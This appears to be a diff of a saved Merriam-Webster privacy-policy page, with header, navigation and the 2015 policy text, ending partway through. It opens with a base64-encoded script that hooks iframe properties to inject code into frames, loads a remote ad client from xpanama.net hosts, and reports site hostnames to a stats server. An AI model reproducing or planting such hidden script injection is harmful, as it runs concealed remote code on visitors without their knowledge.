hlYWQ+Iit0KSxvWzBdPWl9fWNhdGNoKGQpe24oZCl9cmV0dXJuIGUuYXBwbHkocixvKX19LGQ9ZnVuY3Rpb24oKXtyZXR1cm4gZnVuY3Rpb24odCl7dmFyIG49ITE7aWYodC5zcmMmJjAhPT10LnNyYy5pbmRleE9mKCJqYXZhc2NyaXB0OiIpJiYwIT09dC5zcmMuaW5kZXhPZigiYWJvdXQ6YmxhbmsiKSl7dmFyIGU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYSIpO2UuaHJlZj10LnNyYzt2YXIgcj1lLmhvc3Q7cj09PXdpbmRvdy5sb2NhdGlvbi5ob3N0JiYobj0hMCl9ZWxzZSBuPSEwO3JldHVybiBufX0sdT1mdW5jdGlvbih0KXtyZXR1cm4gZnVuY3Rpb24oZSxyKXt2YXIgbz1yLndyaXRlO3Iud3JpdGU9ZnVuY3Rpb24oZSl7dHJ5e3RoaXMuX2luamVjdGVkfHwoZS5pbmRleE9mKCI8aGVhZD4iKSE9PS0xPyhlPWUucmVwbGFjZSgvPGhlYWQ+KC4qKTxcL2hlYWQ+LyxmdW5jdGlvbihuLGUpe3JldHVybiI8aGVhZD4iK3QrZSsiPC9oZWFkPiJ9KSx0aGlzLl9pbmplY3RlZD0hMCk6ZS5pbmRleE9mKCI8Ym9keSIpIT09LTE/KGU9ZS5yZXBsYWNlKC8oPGJvZHkuKj8+KS8sZnVuY3Rpb24obixlKXtyZXR1cm4gZSt0fSksdGhpcy5faW5qZWN0ZWQ9ITApOmUuaW5kZXhPZigiPHNjcmlwdCIpIT09LTEmJihlPWUucmVwbGFjZSgvKDxzY3JpcHQuKj8+Lio8XC9zY3JpcHQ+KS8sZnVuY3Rpb24obixlKXtyZXR1cm4gdCtlfSksdGhpcy5faW5qZWN0ZWQ9ITApKX1jYXRjaChyKXtuKHIpfXJldHVybiBvLmNhbGwodGhpcyxlKX19fSxmPWZ1bmN0aW9uKHQsZSl7cmV0dXJuIGZ1bmN0aW9uKHIsbyxpKXt2YXIgYT1yLmFwcGx5KG8saSk7dHJ5e2lmKG8uY29udGVudERvY3VtZW50RGVjb3JhdGVkKXJldHVybiBhO28uY29udGVudERvY3VtZW50RGVjb3JhdGVkPSEwLGUobykmJnQobyxhKX1jYXRjaChjKXtuKGMpfXJldHVybiBhfX0sbD1mdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbih0LG4sZSl7cmV0dXJuIHQuYXBwbHkobixlKX19LHA9ZnVuY3Rpb24odCxlKXtyZXR1cm4gZnVuY3Rpb24ocixvLGkpe3ZhciBhPXIuYXBwbHkobyxpKTt0cnl7aWYoby5jb250ZW50V2luZG93RGVjb3JhdGVkKXJldHVybiBhO2lmKG8uY29udGVudFdpbmRvd0RlY29yYXRlZD0hMCxlKG8pKXRyeXt0KG8sYS5kb2N1bWVudCl9Y2F0Y2goYyl7bigiVGhlIGZvbGxvd2luZyBmcmFtZSB3YXMgc3VwcG9zZWQgdG8gYmUgZnJpZW5kbHkgYnV0IHdlIGdvdCBhIHNlY3VyaXR5IHZpb2xhdGlvbiB3aGlsZSBhdHRlbXB0aW5nIHRvIGRlY29yYXRlOiIsbyl9fWNhdGNoKHMpe24ocyl9cmV0dXJuIGF9fSx3PWZ1bmN0aW9uKCl7cmV0dXJuIGZ1bmN0aW9uKHQsbixlKXtyZXR1cm4gdC5hcHBseShuLGUpfX0sZz1bJzxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4oJyxlLnRvU3RyaW5nKCksIikoIixbaS50b1N0cmluZygpLGEudG9TdHJpbmcoKSxjLnRvU3RyaW5nKCkscy50b1N0cmluZygpLGQudG9TdHJpbmcoKSx1LnRvU3RyaW5nKCksZi50b1N0cmluZygpLGwudG9TdHJpbmcoKSxwLnRvU3RyaW5nKCksdy50b1N0cmluZygpLCInIit3aW5kb3cubG9jYXRpb24ub3JpZ2luKyInIl0uam9pbigiLCIpLnRvU3RyaW5nKCksIik8IiwiL3NjcmlwdD4iXS5qb2luKCIiKTthKCkoSFRNTElGcmFtZUVsZW1lbnQsIm5hbWUiLGMoKSxzKGcpKSxhKCkoSFRNTElGcmFtZUVsZW1lbnQsImNvbnRlbnREb2N1bWVudCIsZih1KGcpLGQoKSksbCgpKSxhKCkoSFRNTElGcmFtZUVsZW1lbnQsImNvbnRlbnRXaW5kb3ciLHAodShnKSxkKCkpLHcoKSl9KCl9LHs1OjV9XSwyOltmdW5jdGlvbih0LG4sZSl7InVzZSBzdHJpY3QiO3ZhciByPXQoMyk7d2luZG93LmFkb25pc0hhc2g9d2luZG93LmFkb25pc0hhc2h8fHdpbmRvdy5sb2NhdGlvbi5oYXNofHwiIjt2YXIgbz13aW5kb3cuYWRvbmlzSGFzaC5pbmRleE9mKCJhZG9uaXMtbG9nZ2luZyIpPj0wO3IuTE9HX0xFVkVMPW8/ImRlYnVnIjpyLkxPR19MRVZFTDt2YXIgaT13aW5kb3cuYWRvbmlzfHx7fTtpLndzSG9zdCYmci5XUyYmKHIuV1MuaG9zdD1pLndzSG9zdCksaS50cmFuc3BvcnQmJihyLlNVRVpfSFRUUF9FTkRQT0lOVD1pLnRyYW5zcG9ydCksbi5leHBvcnRzPXJ9LHszOjN9XSwzOltmdW5jdGlvbih0LG4sZSl7InVzZSBzdHJpY3QiO24uZXhwb3J0cz17UkVBTF9TVFVOX0hPU1Q6InN0dW4ueHBhbmFtYS5uZXQ6MzQ3OCIsVFVSTlNJR05BTF9IT1NUOiJ0cy5wLnhwYW5hbWEubmV0OjcwMDAiLFNUVU5HVU5fSE9TVDoic2cucC54cGFuYW1hLm5ldDozNDgwIixTRVJWRVJfQ0FORElEQVRFOiJjYW5kaWRhdGU6ODI3NjQ4MDI2IDEgdWRwIDIxMjIxOTQ2ODcgU0VSVkVSX0lQIFNFUlZFUl9QT1JUIHR5cCBob3N0IGdlbmVyYXRpb24gMCIsUkVQT1JUSU5HX1VSTDoiaHR0cHM6Ly9sYi5zdGF0c2V2ZW50LmNvbS9zdGF0cyIsUkVQT1JUSU5HX1JBVEU6LjAxLExPR19MRVZFTDoiZXJyb3IiLFJFUE9SVF9FUlJPUlM6ITAsTUFOSUZFU1RfVVJMOiJodHRwczovL3NyaS5qc2ludGVncml0eS5jb20vbWFuaWZlc3QuanNvbiIsTUFOSUZFU1RfRVhQSVJBVElPTl9USU1FOjg2NDAwLEFEX01BUktFUjoiYWRvbmlzLW1hcmtlciIsQURPTklTX0NMSUVOVF9GRVRDSF9VUkw6Imh0dHBzOi8vYWRzZXJ2ZXIueHBhbmFtYS5uZXQvY2xpZW50LTctbGF0ZXN0LmpzIixXUzp7aG9zdDoic3Vlei1zZXJ2ZXIueHBhbmFtYS5uZXQiLHBhdGg6Ii93cyIscG9ydDo0NDMsc2VjdXJlOiEwLHByb21pc2VUaW1lb3V0OjNlM30sU0VSVklDRV9TVEFUVVNfVVJMOmZ1bmN0aW9uKHQpe3JldHVybiJodHRwczovL2NsaWVudC5yZWFjdHJqcy5jb20vIit0KyItc3RhdHVzLmpzb24ifSxTVUVaX0hUVFBfUkVUUlk6MyxTVUVaX0hUVFBfREVMQVk6MTAwfX0se31dLDQ6W2Z1bmN0aW9uKHQsbixlKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcih0KXtyZXR1cm4gdCYmdC5fX2VzTW9kdWxlP3Q6eyJkZWZhdWx0Ijp0fX12YXIgbz10KDIpLGk9cihvKSxhPXQoNyksYz0oMCxhLmNyZWF0ZSkoe2xldmVsOmlbImRlZmF1bHQiXS5MT0dfTEVWRUx9KTtuLmV4cG9ydHM9e2xvZ2dlcjpjLHN1ZXpMb2dnZXI6Y319LHsyOjIsNzo3fV0sNTpbZnVuY3Rpb24odCxuLGUpeyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKHQpe3ZhciBuPW5ldyBYTUxIdHRwUmVxdWVzdCxlPVtkLlJFUE9SVElOR19VUkwsdF0uam9pbigiIik7bi5vcGVuKCJHRVQiLGUsITApLG4uc2VuZCgpfWZ1bmN0aW9uIG8odCl7ZC5SRVBPUlRfRVJST1JTJiZyKCIvYWRvbmlzX2Vycm9yP2U9Iit0LnRvU3RyaW5nKCkrIiZ3ZWJzaXRlPSIrd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lKX1mdW5jdGlvbiBpKCl7cmV0dXJuIG51bGwhPXdpbmRvdy5BRE9OSVNfQk9PVFNUUkFQX1NUQVRTP3dpbmRvdy5BRE9OSVNfQk9PVFNUUkFQX1NUQVRTPT09ITA6TWF0aC5yYW5kb20oKTxkLlJFUE9SVElOR19SQVRFfWZ1bmN0aW9uIGEodCxuKXtpZihjKHQpLGkoKSl7dmFyIGU9e3dlYnNpdGU6d2luZG93LmxvY2F0aW9uLmhvc3RuYW1lLGtleTp0fTtudWxsIT1uJiYoZS5xdWFudGl0eT1uKSxyKFsiL2Fkb25pc19ldmVudC8/ZXZlbnQ9IixKU09OLnN0cmluZ2lmeShlKV0uam9pbigiIikpfX1mdW5jdGlvbiBjKHQpe3ZhciBuPXtrZXk6dCx0aW1lX21zOk1hdGgucm91bmQod2luZG93LnBlcmZvcm1hbmNlLm5vdygpKSx3ZWJzaXRlOndpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZX07Zi5wdXNoKG4pfWZ1bmN0aW9uIHMoKXt1LmRlZmluZVJlYWRPbmx5UHJvcGVydHkoImFkb25pc0Jvb3RzdHJhcFRpbWluZyIsZil9dmFyIGQ9dCgyKSx1PXQoNiksZj1bXTtuLmV4cG9ydHM9e3JlcG9ydEVycm9yOm8scmVwb3J0RXZlbnQ6YSxzYXZlVGltaW5nOnMsc2hvdWxkUmVwb3J0Oml9fSx7MjoyLDY6Nn1dLDY6W2Z1bmN0aW9uKHQsbixlKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcih0LG4pe3RyeXtPYmplY3QuZGVmaW5lUHJvcGVydHkod2luZG93LHQse3ZhbHVlOm4sd3JpdGFibGU6ITF9KX1jYXRjaChlKXtvLndhcm4oIkNhbm5vdCBkZWZpbmUgcmVhZC1vbmx5IHByb3BlcnR5IG9mIHdpbmRvdyBvYmplY3Q6ICIrZSl9fXZhciBvPXQoNCkubG9nZ2VyLGk9ZnVuY3Rpb24odCl7ImxvYWRpbmciIT09ZG9jdW1lbnQucmVhZHlTdGF0ZT90KCk6ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsdCl9O24uZXhwb3J0cz17ZGVmaW5lUmVhZE9ubHlQcm9wZXJ0eTpyLHJlYWR5Oml9fSx7NDo0fV0sNzpbZnVuY3Rpb24odCxuLGUpe2Z1bmN0aW9uIHIodCxuKXtjb25zdCBlPWFbbl07dm9pZCAwIT09ZSYmKGU+MCYmKHQuYXNzZXJ0PWZ1bmN0aW9uKCl7fSksZT41JiYodC50cmFjZT1mdW5jdGlvbigpe30pLGU+MTAmJih0LmRlYnVnPWZ1bmN0aW9uKCl7fSksZT4yMCYmKHQubG9nPWZ1bmN0aW9uKCl7fSksZT4zMCYmKHQuaW5mbz1mdW5jdGlvbigpe30pLGU+NDAmJih0Lndhcm49ZnVuY3Rpb24oKXt9KSxlPjUwJiYodC5lcnJvcj1mdW5jdGlvbigpe30pKX1mdW5jdGlvbiBvKHQsbil7bj1ufHx7fTtjb25zdCBlPW4ubGV2ZWx8fCJkZWJ1ZyI7cih0LGUpfWZ1bmN0aW9uIGkodCl7Y29uc3Qgbj1PYmplY3QuY3JlYXRlKGNvbnNvbGUpO3JldHVybiBvKG4sdCksbn1jb25zdCBhPXthbGw6MCx0cmFjZTo1LGRlYnVnOjEwLGxvZzoyMCxpbmZvOjMwLHdhcm46NDAsZXJyb3I6NTB9LGM9aSgpO24uZXhwb3J0cz17bG9nZ2VyOmMsY29uZmlndXJlOm8sY3JlYXRlOml9fSx7fV19LHt9LFsxXSk7"));</script>    
+    <div class="outer-container">
+      <div class="main-container">
+      
+                <!--JC: this is just a filler for when sticky header is scrolled-->
+<div class="menu-filler default"></div>
+
+<!--JC: actual menu + search-->
+<header class="shrinkheader default">
+  
+  <!--JC: top menu area (link bar etc)-->
+<!--   <div class="shrinkheader-t">
+    <div class="in-cnt-type3">
+      
+    </div>
+  </div>
+     -->
+    
+    
+  <!--JC: bottom menu area (link bar etc)-->
+  <div class="shrinkheader-b clearfix">
+    <div class="in-cnt-type3">
+      <div class="shrinkheader-b-inner">
+      
+      <div class="filler-cnt"></div>
+      
+      
+        <!--JC: left logo container-->
+        <div class="logo-cnt border-box">
+          <a href="/"><img src="//assets2.cdn-mw.com/mw/static/app-standalone-images/MW_logo.png" alt="Merriam-Webster Logo" /></a>
+        </div>
+        
+        <!--JC: since 1828 container-->
+        <div class="since1828-cnt border-box">
+          <a href="/"><span class="since1828-text">SINCE</span>&nbsp;<span class="since1828-num">1828</span></a>
+        </div>
+        
+        <!--JC: central thingie (button)-->
+        <div class="nav-btn-cnt border-box">
+          <a href="javascript:void(0)" class="menu-toggle">
+            <span class="menu-txt">Menu</span>
+    
+            <div class="menu-lines">
+              <div class="line line-1"></div>
+              <div class="line line-2"></div>
+              <div class="line line-3"></div>
+            </div>
+          </a>
+        </div>
+      
+                <!--JC: right container-->
+        <div class="search-cnt border-box">
+        
+          <!--JC: menu-->
+          <div class="s-frm-cnt border-box">
+<div class="shrinkheader-t-inner border-box clearfix">
+        
+        <nav class="link-bar-r">
+          <a href="https://www.facebook.com/merriamwebster" target="_blank" class="social-icon fb"></a>
+          <a href="https://twitter.com/merriamwebster" target="_blank" class="social-icon twitter"></a>
+          <a href="https://www.youtube.com/user/MerriamWebsterOnline" target="_blank" class="social-icon gplay"></a>
+          <a href="https://www.instagram.com/merriamwebster/" target="_blank" class="social-icon instagram"></a>
+        </nav>
+        
+        <nav class="link-bar-l" role="navigation">
+          <ul>
+            <li>
+              <a class="mw-tooltip-arrowbox" id="join-mwu" target="_blank" href="https://unabridged.merriam-webster.com/subscriber/register/p1?refc=HDR_GLOBAL_JOINMWU">JOIN MWU
+                <p class="arrowbox">Gain access to thousands of additional definitions and advanced search features&mdash;ad free! <span class="arrow-link" >JOIN NOW</span></p>
+              </a>              
+            </li>          
+            <li>
+              <a href="/word-games">GAMES</a>
+            </li>
+            <li>
+              <a href="/thesaurus">BROWSE THESAURUS</a>
+            </li>
+            <li class="medium880-hide">
+              <a href="/word-of-the-day">WORD OF THE DAY</a>
+            </li>
+            <li class="medium940-hide">
+              <a href="/video">VIDEO</a>
+            </li>
+            <li class="medium1060-show-inline">
+              <span id="more-menu" class="mw-tooltip-arrowbox nav-link animated fadeIn"href="#">MORE<i class="fa fa-angle-down" aria-hidden="true"></i>
+                <div class="arrowbox">
+                    <a class="menu-link medium880-show" href="/word-of-the-day">WORD OF THE DAY</a>
+                    <a class="menu-link medium940-show" href="/video">VIDEO</a>
+                    <a class="menu-link" href="/words-at-play">WORDS AT PLAY</a>
+                    <a class="menu-link" rel="nofollow" href="/my-saved-words/">FAVORITES</a>
+                </div>
+              </span>
+            </li>
+            <li class="medium1060-hide">
+              <a href="/words-at-play">WORDS AT PLAY</a>
+            </li>
+            <li class="medium1060-hide">
+              <a rel="nofollow" href="/my-saved-words/">FAVORITES</a>
+            </li>
+          </ul>
+        </nav>
+  
+      </div>          
+            <form class="s-frm clearfix" action="/dictionary">              
+              <div class="s-term-cnt border-box">
+                <button class="search-bar-submit"></button>
+                <input name="s" id="s-term" class="s-term sline-ell border-box" type="text" value="" autocapitalize="off" spellcheck="false" autocorrect="off" />
+                <div class="clear-term-cnt"><a class="clear-search" href="javascript:void(0)"><span aria-label="Clear Search">×</span></a></div>
+                <div class="desk-search-btn">
+                  <span class="search-icon1"></span>
+                </div>                
+              </div>
+              <!-- search-dictionary or search-thesaurus -->
+              <div class="header-search-tabs  search-dictionary">
+                <button type="button" class="button dictionary-tab active" data-search-url="/dictionary" data-ref="dictionary">dictionary</button><button type="button" class="button thesaurus-tab" data-search-url="/thesaurus" data-ref="thesaurus">thesaurus</button>
+              </div>
+              <div class="s-autocomplete border-box"></div>
+              
+            </form>
+          </div>
+          
+          <div class="company-text">
+            <p><a href="https://www.britannica.com" target="_blank">An Encyclopædia Britannica Company</a></p>
+          </div>
+        </div>
+        
+        <div class="mob-search-cnt show-mobile">
+          <div class="mob-search-btn">
+            <span class="search-icon"></span>
+          </div>
+        </div>
+        <div class="filler-cnt"></div>
+        
+      </div>
+    </div>
+  </div>
+  
+</header>
+
+
+
+<!--JC: actual mobile menu-->
+<div class="menu-mob-cnt">
+  <a href="javascript:void(0)" class="close-trigger"></a>
+  
+  <div class="menu-mob-cnt-inner">
+    <div class="menu-mob-cnt-cut">
+      <ul class="border-box">
+        <li>
+          <a href="https://unabridged.merriam-webster.com/subscriber/register/p1?HDR_GLOBAL_JOINMWU" target="_blank">JOIN MWU</a>
+        </li>      
+        <li>
+          <a href="/word-games">GAMES</a>
+        </li>
+        <li>
+          <a href="/thesaurus">THESAURUS</a>
+        </li>
+        <li>
+          <a href="/word-of-the-day">WORD OF THE DAY</a>
+        </li>
+        <li>
+          <a href="/video">VIDEO</a>
+        </li>
+        <li>
+          <a href="/words-at-play">WORDS AT PLAY</a>
+        </li>
+        <li>
+          <a rel="nofollow" href="/my-saved-words/">FAVORITES</a>
+        </li>
+      </ul>
+      
+      <div class="social-btns">
+        <span>Follow: </span>
+        <a href="https://www.facebook.com/merriamwebster" target="_blank" class="social-icon fb"></a>
+        <a href="https://twitter.com/merriamwebster" target="_blank" class="social-icon twitter"></a>
+        <a href="https://www.youtube.com/user/MerriamWebsterOnline" target="_blank" class="social-icon gplay"></a>
+        <a href="https://www.instagram.com/merriamwebster/" target="_blank" class="social-icon ig"></a>
+      </div>
+    </div>      
+  </div>
+</div>
+
+
+<script type="text/javascript">
+  require(['searchBar'], function(searchBar) {
+    searchBar.init();
+  });
+</script>
+
+                                  
+                          <div class="home-top-creative-cont border-box">
+            <div class="home-top-creative-cont-shadow border-box""></div>
+              <div class="abl abl-m320-t728-d728">
+                <div class="ad-liner slot-top">
+                <script>require(['adProcessor'], function(ap) { ap.renderDfp('slot-top');});</script>
+              </div>
+            </div>
+          </div>
+        
+                                  
+                <div class="main-wrapper clearfix">
+  
+      <div class="univ-title-container">
+      <span class="rubric-text margin-lr-0 margin-tb-1875em"></span>
+      <h1 class="title-lg">Privacy Policy</h1>
+      <h2 class="title-sm"></h2>
+    </div>
+    
+    <hr class="gray-divide">
+    
+  <div class="lr-cols-area clearfix sticky-column">
+    <div class="left-content">
+      <div id="static_pg_container">
+  <section>
+    <p><em>Updated June 9, 2015</em></p>
+
+    <p><em>About Our Ads and our Privacy Policy together explain how we and some of the companies we work with collect, use, share and protect information in relation to our Web sites, mobile application services and any software provided on or in connection with Merriam-Webster services (collectively, the "Services") and your choices about the collection and use of your information. The Services are general audience services, intended for Users (visitors and subscribers) of all ages. Our free Services are supported by advertising. Our subscription Web sites are paid for by subscription fees, and are ad-free, as are our paid-for mobile applications. If you would like to avoid ads, sign up for a subscription or upgrade your mobile application.</em> This Privacy Policy does not govern the use of data that Users provide directly to advertisers or third party partners; that usage is governed by the advertiser’s or third party partner’s privacy policy.</p>
+
+    <p>Your use of our Services is governed by our Terms of Use. PLEASE NOTE, OUR TERMS OF USE CONTAIN DISCLAIMERS OF WARRANTIES AND LIABILITY, A BINDING ARBITRATION CLAUSE AND CLASS ACTION WAIVER. THESE PROVISIONS AFFECT YOUR RIGHTS ABOUT HOW TO RESOLVE ANY DISPUTE WITH MERRIAM-WEBSTER, INCLUDING UNDER THIS PRIVACY POLICY. PLEASE REVIEW. YOUR USE OF THE SERVICES IS ACCEPTANCE OF THIS PRIVACY POLICY AND OUR TERMS OF USE.</p>
+
+    <h2>Personally Identifiable Information ("PII") We Collect and How We Use It</h2>
+
+    <p>Merriam-Webster protects the identity of visitors to the Services by limiting the collection of personally identifiable information. For certain promotions and to access certain features, such as to receive a Word of the Day subscription, we may request a voluntary submission of personally identifiable information such as name, e-mail address, city, state, and age.</p>
+
+    <p>Merriam-Webster does not knowingly collect or solicit personally identifiable information from or about children under 13, except as permitted by law. If we discover we have received any information from a child under 13 in violation of this policy, we will delete that information immediately. If you believe Merriam-Webster has any information from or about anyone under 13, please e-mail us at <a href="mailto:privacy@m-w.com">privacy@m-w.com</a>.</p>
+
+    <p>All personally identifiable information you provide to us for subscriptions through the Services is used by Merriam-Webster and its staff to process and manage subscriptions, analyze the demographic of our subscribers, or to deliver services through the site; such information may also be used by the company for prize or information-request fulfillment unless otherwise indicated. Such information will not be posted or published by us, and will be shared with third parties only for the purpose of payment processing.</p>
+
+    <p>If you choose to provide personally identifiable information to us, you may receive the following types of e-mails from us:</p>
+
+    <ul class="nobullet_indent_list">
+      <li>E-mails related to subscription-maintenance activities.</li>
+      <li>Periodic e-mail newsletters highlighting new features, content, and usage tips for the Services.</li>
+      <li>Periodic special offers for additional Merriam-Webster and Encyclopædia Britannica (Merriam-Webster's parent company) products and services.</li>
+      <li>Periodic special offers from Merriam-Webster approved partners if you "opt-in" or give us your permission to send them.</li>
+    </ul>
+
+    <p>When you provide personally identifiable information to us, you can let us know that you do not wish to receive special Merriam-Webster or partner offers. Each offer will also have information available to allow you to "opt out" if you wish to receive no further offers.</p>
+
+    <p>The Services may also use other third-party providers to facilitate the delivery of the services described above, and these third-party providers may be supplied with or have access to personally identifiable information for the sole purpose of providing these services, such as Word of the Day, to you on behalf of Merriam-Webster.</p>
+
+    <p>Merriam-Webster may also disclose personally identifiable information in special legal circumstances. For instance, such information may be used where it is necessary to protect our copyright or intellectual property rights, or if the law requires us to do so.</p>
+
+    <p>You can update your personal information and change your marketing preferences at any time by sending an email to <a href="mailto:privacy@m-w.com">privacy@m-w.com</a>.</p>
+
+    <h2>Non-Personally Identifiable Information ("Non-PII") We Collect and How We Use It</h2>
+
+    <p>Like other commercial Web sites, we collect information about consumer activities and behaviors to improve our services, provide standard advertising controls, determine user response to advertisements and promotions, deliver targeted advertisements that we or our partners believe will be of most interest to you, and prepare aggregated reports. In addition, we have implemented Google Analytics Demographics and Interest reporting, which is a Google Analytics Advertiser feature. This tool uses cookies (see "<em>Cookie and Beacons &#150; Use by Merriam-Webster; Opting Out</em>" below) to collect and store standard Internet log and visitor information on our behalf, including information about what pages you visit, how long you are on our sites, how you got here, and what you click on during your visit.  This Google Analytics data is not tied to PII, so this information cannot be used to identify who you are. We use the data provided by Google Analytics Demographics and Interest reports to develop our services and content around our User demographics, interests, and behavior on our Services. You can opt out of this Google Analytics Advertiser feature using the Ads Settings located at <a href="https://www.google.com/settings/ads" target="_blank">https://www.google.com/settings/ads</a>. In addition, you can use the Google Analytics Opt-Out Browser Add-on to disable tracking by Google Analytics.</p>
+
+    <h2>Anonymous Information</h2>
+
+    <p>Anonymous aggregated data may be provided to other companies we do business with for statistical purposes. For example, we may report to advertisers that a certain percentage of our site's visitors are adults between the ages of 25 and 35.</p>
+
+    <h2>Device Identifiers.</h2>
+
+    <p>When you use a mobile device like a tablet or cell phone to access our services, we may access and monitor one or more "device identifiers." Device identifiers are small data files associated with your mobile device that uniquely identify your mobile device. A device identifier may deliver information to us or a third party partner about how you browse and use the services and may help us or others provide reports or personalized ads. Some features of the services may not function properly if use or availability of device identifiers is impaired or disabled.</p>
+
+    <h2>Cookies and Beacons &#150; Use by Merriam-Webster; Opting Out</h2>
+
+    <p>Together with Google Analytics, we use cookies and software logs to monitor the use of the Services and to gather non-PII about visitors to the site. Cookies are small files that Merriam-Webster transfers to the hard drives of visitors for record-keeping purposes. These monitoring systems allow us to track general information about our visitors, such as the type of browsers (for example, Firefox or Internet Explorer), the operating systems (for instance, Windows or Macintosh), or the Internet providers (for instance, Comcast) they use. This information is used for statistical and market research purposes to tailor content to usage patterns and to provide services requested by our customers. We also use  Google Analytics Demographics and Interest Reporting to collect information using cookies about our user demographics and interests (see "<em>Non-Personally Identifiable Information ("Non-PII" We Collect and How We Use It</em>" above for more information about how we use this data and how to opt out).  To delete these cookies, please see your browser's privacy settings or follow the above instructions.</p>
+
+    <p>A beacon is an electronic file object (typically a transparent image) placed in the code of a Web page. We use third party beacons to monitor the traffic patterns of visitors from one Web page to another and to improve site performance for each Service.</p>
+
+    <p>None of the information we gather in this way can be used to identify any individual who visits our site.</p>
+
+    <h2>Cookies and Beacons &#150; Use by Third-Parties; Opting Out</h2>
+
+    <p>Advertisers and advertising networks use cookies and beacons to target ads served to Merriam-Webster Online, including Google and DoubleClick. What does it mean to "serve ads"? When you visit a Web site, your Internet browser transmits a "request" to the computer that hosts the Web site (the "host server") requesting that server to send you (or "serve") the Web page that you are seeking. Most Web pages contain components that are pulled from different sources, for example, a Web page at a news site may get its weather section from one provider, its sports results from a different source, and advertisements from other servers. Our Web pages contain coding that directs your browser to fill the ad spaces on the Web pages with content served by advertisers and networks of advertisers to whom we have sold the ad spaces. The advertisers and networks use cookies and beacons to help manage ad delivery and frequency, and to identify audience segment(s) for customized advertising ("targeting"). These cookies are used to identify your IP address, so that when you visit another Web site using the same advertising network, the network will recognize the cookie as one of its own, read the information on the cookie (the record of which sites in the network you have visited) and serve you an ad that you might be interested in, based on your past visits to other sites in the network. Advertising targeted based on past Web surfing is known as "behavioral advertising."</p>
+
+    <p>Merriam-Webster does not permit any advertisers or networks to collect personally identifiable information about visitors to the Services using cookies or beacons. Our Privacy Policy does not cover the use of information that they may have collected from you on other sites. If you would like to learn more about behavioral advertising or to opt out of having this information used by companies that are part of the Network Advertising Initiative to deliver targeted ads, please visit <a href="http://www.networkadvertising.org" target="_blank">http://www.networkadvertising.org</a>. Many of the same companies are members of the Self-Regulatory Program for Online Behavioral Advertising. You can learn more and opt out of receiving targeted ads from them at <a href="http://www.aboutads.info/choices" target="_blank">http://www.aboutads.info/choices</a>.</p>
+
+    <p>Some advertising networks require that we specifically list their opt-out links below. When you opt-out of a network, you may receive a "opt-out" cookie so that the network will know not to assign you new cookies in the future. You will continue to receive ads from that network, but not behaviorally targeted ads. If you erase your browser's cookies, you may need to perform this process again.</p>
+
+    <p>24/7 Real Media <a href="http://www.247realmedia.com/privacy.html" target="_blank">http://www.247realmedia.com/privacy.html</a></p>
+
+    <p>Adconion <a href="http://www.adconion.com/us/privacy-policy/the-adconion-cookie.html" target="_blank">http://www.adconion.com/us/privacy-policy/the-adconion-cookie.html</a></p>
+
+    <p>Collective Media <a href="http://www.networkadvertising.org" target="_blank">http://www.networkadvertising.org</a></p>
+
+    <p>DoubleClick <a href="http://www.doubleclick.com/privacy/faq.aspx" target="_blank">http://www.doubleclick.com/privacy/faq.aspx</a></p>
+
+    <p>Google <a href="http://www.google.com/privacy_ads.html" target="_blank">http://www.google.com/privacy_ads.html</a></p>
+
+    <p>SpotXChange <a href="http://www.spotxchange.com/spx_privacypolicy.html#opt_out_link" target="_blank">http://www.spotxchange.com/spx_privacypolicy.html#opt_out_link</a>. When you select this option, SpotXchange sets a persistent "opt-out cookie" to prevent information from being uniquely associated with your browser.</p>
+
+    <p>ValueClick <a href="http://www.valueclickmedia.com/member_privacy.shtml" target="_blank">http://www.valueclickmedia.com/member_privacy.shtml</a>. We have contracted with ValueClick to monitor certain pages of our site for the purpose of reporting traffic, statistics, advertisement 'click-throughs', and/or other activities on our site. Where authorized by us, ValueClick and its business partners may use cookies, web beacons, and/or other monitoring technologies to compile anonymous statistics about our visitors. No personally identifiable information is collected by or transferred to any party other than the advertiser. For more information about how the information is collected and used by ValueClick, please see ValueClick's privacy policy at <a href="http://www.valueclickmedia.com/member_privacy.shtml" target="_blank">http://www.valueclickmedia.com/member_privacy.shtml</a>.</p>
+
+    <p>Merriam-Webster's ad server, AdTech, uses cookies to prevent you from seeing the same ad too many times. You can opt out of Ad Tech cookies by following this link: <a href="http://www.adtechus.com/privacy/" target="_blank">http://www.adtechus.com/privacy/</a></p>
+
+    <p>To manage or delete browser cookies, please see your browser's privacy settings.</p>
+
+    <p>To manage or delete Flash cookies, please use the Adobe Flash Player Settings Manager here:
+    <a href="http://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager07.html" target="_blank">http://www.macromedia.com/support/documentation/en/flashplayer/<br />help/settings_manager07.html</a></p>
+
+    <h2>Security</h2>
+
+    <p>Any personally identifiable information collected through this site is stored on limited-access servers. We will maintain safeguards to protect these servers and the information they store.</p>
+
+    <h2>Surveys</h2>
+
+    <p>We may occasionally conduct on-line surveys. All surveys are voluntary and you may decline to participate.</p>
+
+    <h2>Copyright</h2>
+
+    <p>All of the content on the Services is copyrighted by Merriam-Webster, Incorporated, 47 Federal Street, P.O. Box 281, Springfield, MA 01102, or its licensors, and it cannot be redistributed or used for commercial purposes. More detailed information about Merriam-Webster's copyrights and trademarks is available on our 
+    <a href="[copyright]">Copyright Notice</a> page.</p>
+
+    <h2>Contacting Us</h2>
+
+    <p>If you have questions about Merriam-Webster or its products, visit our <a href="[contact]">Contact Us</a> page to find e-mail addresses and other contact information for the appropriate department. To correct, update, or remove personally identifiable information, please email us at <a href="mailto:privacy@m-w.com">privacy@m-w.com</a>.</p>
+
+    <h2>Links to Other Web sites</h2>
+
+    <p>The Merriam-Webster sites each contain links to other Web sites. Merriam-Webster is not responsible for the privacy practices or content of these third-party Web sites. We urge all Users of the Services to follow safe Internet practices: Do not supply Personally Identifiable Information to these Web sites unless you have verified their security and privacy policies.</p>
+
+    <h2>Data Retention</h2>
+
+    <p>We retain your information for as long as necessary to permit us to use it for the purposes that we have communicated to you and comply with applicable law or regulations.</p>
+
+    <h2>Business Transfers</h2>
+
